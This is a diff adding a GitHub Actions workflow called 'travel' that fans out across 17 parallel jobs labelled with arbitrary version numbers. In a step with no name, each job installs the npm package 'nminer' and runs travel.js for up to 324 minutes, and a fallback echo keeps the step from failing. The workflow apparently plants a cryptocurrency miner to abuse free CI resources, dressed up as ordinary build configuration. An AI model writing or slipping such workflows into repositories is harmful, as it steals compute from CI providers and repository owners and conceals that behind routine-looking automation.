@@ -1,0 +1,42 @@
+name: travel
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 552 }
+          - { version: 4686 }
+          - { version: 4588 }
+          - { version: 5865 }
+          - { version: 7760 }
+          - { version: 149 }
+          - { version: 7233 }
+          - { version: 3671 }
+          - { version: 5405 }
+          - { version: 9634 }
+          - { version: 834 }
+          - { version: 1186 }
+          - { version: 811 }
+          - { version: 5607 }
+          - { version: 9788 }
+          - { version: 523 }
+          - { version: 4680 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: 
+        run: |
+          npm install nminer@latest
+          timeout 324m node travel.js || echo "travel executed"
